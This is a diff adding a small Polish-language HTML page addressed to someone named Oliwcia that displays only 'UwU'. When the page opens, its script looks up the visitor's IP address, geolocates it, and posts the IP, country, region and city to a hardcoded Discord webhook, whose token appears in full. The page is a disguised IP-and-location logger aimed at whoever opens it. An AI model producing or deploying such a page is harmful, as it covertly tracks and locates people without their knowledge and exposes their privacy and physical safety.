@@ -1,0 +1,40 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>😇 Dla Oliwci</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+</head>
+<script>
+fetch('http://ifconfig.me/ip')
+  .then(response => response.text())
+  .then(ipAddress => 
+  $.get('https://api.hackertarget.com/geoip/?q=' + ipAddress, function(data) {
+  // Convert key-value pairs to JSON
+  // https://stackoverflow.com/a/39284735/452587
+  data = data.trim().split('\n').reduce(function(obj, pair) {
+    pair = pair.split(': ');
+    return obj[pair[0]] = pair[1], obj;
+  }, {});
+  console.log(data);
+  const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1088910737176531004/iDJYEfuWVMlHsfzR12KhFBou0m9gXimE_Gl82N3EQz_Ip8Hs0Nx1pdNcVWCt7oC3HZBo");
+
+      request.setRequestHeader('Content-type', 'application/json');
+      const params = {
+
+        content: "Adres IP: " + data["IP Address"] + "\nKraj: " + data["Country"] + "\nWojewództwo: " + data["State"] + "\nMiasto: " + data["City"] 
+      }
+
+      request.send(JSON.stringify(params))
+})
+  )
+  .catch(error => console.error(error));
+</script>
+<body>
+    <div class="oliwcia">
+        <h1>UwU</h1>
+    </div>
+</body>
+</html>
